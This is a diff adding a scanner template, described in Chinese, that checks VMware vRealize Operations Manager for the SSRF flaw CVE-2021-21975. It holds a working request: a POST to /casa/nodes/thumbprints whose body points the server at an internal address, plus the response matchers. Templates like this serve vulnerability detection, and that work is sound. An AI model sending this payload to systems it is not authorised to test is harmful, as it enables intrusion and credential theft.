@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "VMware vRealize Operations Manager API 服务端请求伪造漏洞检测。向 /casa/nodes/thumbprints 端点发送包含内网地址的 POST 请求，若响应包含 vRealize Operations Manager 相关标识且返回状态码 200，则表明存在 SSRF 漏洞，攻击者可利用此漏洞窃取管理员凭据或探测内网服务。"
+id = "POC-AVE-2021-0506"
+name = "vRealize Operations Manager API SSRF PoC"
+severity = "high"
+tags = ["ave-2021-0506"]
+vuln_id = [
+    "CVE-2021-21975",
+    "AVE-2021-0506",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/casa/nodes/thumbprints"
+protocol = "http"
+
+[poc.requests.body]
+content = '["127.0.0.1:443/ui/"]'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json;charset=UTF-8"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "vRealize Operations Manager",
+    "thumbprint",
+    "address",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
